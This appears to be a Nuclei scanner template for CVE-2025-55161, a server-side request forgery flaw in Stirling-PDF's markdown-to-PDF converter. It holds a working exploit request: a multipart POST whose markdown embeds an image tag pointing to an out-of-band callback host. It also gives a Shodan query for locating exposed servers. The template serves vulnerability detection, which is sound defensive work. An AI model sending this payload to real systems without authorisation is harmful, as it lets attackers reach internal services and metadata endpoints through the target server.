id: CVE-2025-55161
info:
  name: Stirling-PDF SSRF via Markdown
  author: beginee
  severity: high
  description: |
    Stirling-PDF prior to v1.1.0 is vulnerable to Server-Side Request Forgery (SSRF) 
    in the markdown-to-pdf conversion feature. An attacker can embed external image 
    references in a markdown file, which are then fetched by the server during PDF generation.
    This may allow access to internal services or sensitive metadata endpoints.

  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-55161
    - https://github.com/Stirling-Tools/Stirling-PDF

  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
    cvss-score: 8.6
    cve-id: CVE-2025-55161
    cwe-id: CWE-918
    epss-score: 0.00051
    epss-percentile: 0.0

  metadata:
    verified: true
    max-request: 1
    vendor: stirling-pdf
    product: markdown-to-pdf
    shodan-query: http.title:"Stirling PDF"
  tags: cve,cve2025,ssrf,stirling-pdf,pdf,markdown

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/v1/convert/markdown/pdf"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvAfAbBmFpYrQfooK
    body: |
      ------WebKitFormBoundaryvAfAbBmFpYrQfooK
      Content-Disposition: form-data; name="fileInput"; filename="ssrf.md"
      Content-Type: application/octet-stream

      <img src='http://{{interactsh-url}}/' />
      ------WebKitFormBoundaryvAfAbBmFpYrQfooK--

    matchers:
      - type: word
        words:
          - "http"
          - "dns"
        condition: or
        part: interactsh_protocol